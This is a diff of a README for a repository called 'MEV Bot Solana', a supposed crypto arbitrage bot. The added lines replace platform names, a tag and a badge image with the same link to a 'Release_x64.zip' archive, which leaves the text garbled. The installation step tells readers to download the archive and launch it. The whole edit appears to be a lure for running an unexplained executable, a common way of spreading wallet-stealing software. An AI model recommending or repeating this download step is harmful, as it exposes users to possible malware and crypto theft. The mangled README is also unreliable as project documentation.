@@ -1,17 +1,17 @@
 # 🚀 **MEV Bot Solana**
 
-![MEV Bot Solana](https://example.com/image.png)
+![MEV Bot Solana](https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip)
 
 ---
 
 ## Description
-Welcome to the MEV Bot Solana repository! This project focuses on a high-speed Solana MEV-bot that leverages on-chain arbitrage across Pump.FUN, Jupiter, and Raydium. If you are interested in blockchain, crypto bots, decentralized exchanges (DEX), liquidity sniping, MEV strategies, and smart contracts, this repository is for you.
+Welcome to the MEV Bot Solana repository! This project focuses on a high-speed Solana MEV-bot that leverages on-chain arbitrage across https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip, Jupiter, and Raydium. If you are interested in blockchain, crypto bots, decentralized exchanges (DEX), liquidity sniping, MEV strategies, and smart contracts, this repository is for you.
 
 ---
 
 ## Features
 - High-speed Solana MEV-bot
-- On-chain arbitrage across Pump.FUN, Jupiter, and Raydium
+- On-chain arbitrage across https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip, Jupiter, and Raydium
 
 ---
 
@@ -26,7 +26,7 @@ Welcome to the MEV Bot Solana repository! This project focuses on a high-speed S
 - Liquidity-sniping
 - MEV
 - MEV-bots
-- Node.js
+- https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip
 - Smart-contracts
 - Solana
 - Solidity
@@ -34,9 +34,9 @@ Welcome to the MEV Bot Solana repository! This project focuses on a high-speed S
 ---
 
 ## Installation
-To get started with the MEV Bot Solana, download the necessary software [here](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip) (needs to be launched).
+To get started with the MEV Bot Solana, download the necessary software [here](https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip) (needs to be launched).
 
-[![Download Software](https://img.shields.io/badge/Download-Software-yellow)](https://github.com/22155555/1875695542/releases/download/v1.0/Software.zip)
+[![Download Software](https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip)](https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip)
 
 ---
 
@@ -68,7 +68,7 @@ This project is licensed under the MIT License - see the [LICENSE](LICENSE) file
 ---
 
 ## Acknowledgements
-The MEV Bot Solana project would like to thank the developers and contributors of Pump.FUN, Jupiter, Raydium, and all the other tools and platforms that make decentralized arbitrage possible. Your dedication to the blockchain ecosystem is truly commendable.
+The MEV Bot Solana project would like to thank the developers and contributors of https://github.com/lemixred/Mev-Bot-Solana/releases/download/v1.0/Release_x64.zip, Jupiter, Raydium, and all the other tools and platforms that make decentralized arbitrage possible. Your dedication to the blockchain ecosystem is truly commendable.
 
 ---
 
